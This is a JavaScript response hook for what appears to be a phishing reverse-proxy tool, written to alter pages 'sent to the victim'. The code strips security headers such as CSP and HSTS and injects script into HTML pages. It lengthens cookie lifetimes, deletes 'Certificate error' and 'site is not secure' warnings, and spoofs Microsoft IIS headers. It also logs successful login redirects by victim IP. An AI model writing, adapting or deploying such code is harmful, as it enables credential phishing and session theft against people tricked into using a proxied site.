/**
 * On Response Hook
 * 
 * This hook is executed for every response before it's sent to the victim.
 * You can modify headers, inject content, or log information.
 * 
 * Author: billion_laughs
 * Version: 1.0.0
 * 
 * @param {Object} req - Original request object
 * @param {Object} resp - Response object
 * @param {number} resp.status - HTTP status code
 * @param {Object} resp.headers - Response headers
 * @param {string} resp.body - Response body
 * @param {Object} resp.cookies - Cookies to set
 * @returns {Object} Modified response object
 */

function onResponse(req, resp) {
  // Log responses (for debugging)
  console.log('[OnResponse]', resp.status, req.path, 'to', req.ip);

  // Example 1: Remove security headers that might interfere
  const headersToRemove = [
    'Content-Security-Policy',
    'X-Frame-Options',
    'X-Content-Type-Options',
    'Strict-Transport-Security',
  ];

  headersToRemove.forEach(function(header) {
    if (resp.headers[header]) {
      delete resp.headers[header];
      console.log('[OnResponse] Removed header:', header);
    }
  });

  // Example 2: Inject custom JavaScript into HTML responses
  if (resp.headers['Content-Type'] && resp.headers['Content-Type'].includes('text/html')) {
    // Inject analytics or tracking code
    const customScript = '<script>console.log("Custom tracking initialized");</script>';
    
    if (resp.body.includes('</body>')) {
      resp.body = resp.body.replace('</body>', customScript + '</body>');
      console.log('[OnResponse] Injected custom script into HTML');
    }
  }

  // Example 3: Modify cookies
  if (resp.cookies) {
    Object.keys(resp.cookies).forEach(function(cookieName) {
      // Extend cookie expiration
      if (resp.cookies[cookieName].maxAge) {
        resp.cookies[cookieName].maxAge = 86400 * 30; // 30 days
      }

      // Remove Secure flag if needed (for testing)
      // resp.cookies[cookieName].secure = false;

      // Log cookie being set
      console.log('[OnResponse] Setting cookie:', cookieName);
    });
  }

  // Example 4: Replace specific content in responses
  if (resp.body && typeof resp.body === 'string') {
    // Replace error messages
    resp.body = resp.body.replace(/This site is not secure/gi, '');
    resp.body = resp.body.replace(/Certificate error/gi, '');
    
    // Replace branding (use carefully)
    // resp.body = resp.body.replace(/Microsoft Corporation/gi, 'Microsoft');
  }

  // Example 5: Add custom headers
  resp.headers['X-Powered-By'] = 'Microsoft-IIS/10.0';
  resp.headers['X-AspNet-Version'] = '4.0.30319';

  // Example 6: Log successful authentication
  if (req.path.includes('login') && resp.status === 302) {
    console.log('[OnResponse] Successful login redirect detected for', req.ip);
  }

  // Example 7: Modify JSON responses
  if (resp.headers['Content-Type'] && resp.headers['Content-Type'].includes('application/json')) {
    try {
      const jsonData = JSON.parse(resp.body);
      
      // Modify JSON data if needed
      if (jsonData.error) {
        console.log('[OnResponse] API error:', jsonData.error);
      }
      
      // Re-serialize
      resp.body = JSON.stringify(jsonData);
    } catch (e) {
      // Not valid JSON, skip
    }
  }

  // Example 8: Cache control
  if (req.path.includes('/static/') || req.path.includes('/assets/')) {
    // Enable caching for static resources
    resp.headers['Cache-Control'] = 'public, max-age=86400';
  } else {
    // Disable caching for dynamic content
    resp.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate';
    resp.headers['Pragma'] = 'no-cache';
    resp.headers['Expires'] = '0';
  }

  // Example 9: Compress responses (if not already compressed)
  if (resp.body && resp.body.length > 1024 && !resp.headers['Content-Encoding']) {
    // Note: Actual compression would require a compression library
    // This is just a placeholder
    console.log('[OnResponse] Response size:', resp.body.length, 'bytes');
  }

  // Return modified response
  return resp;
}
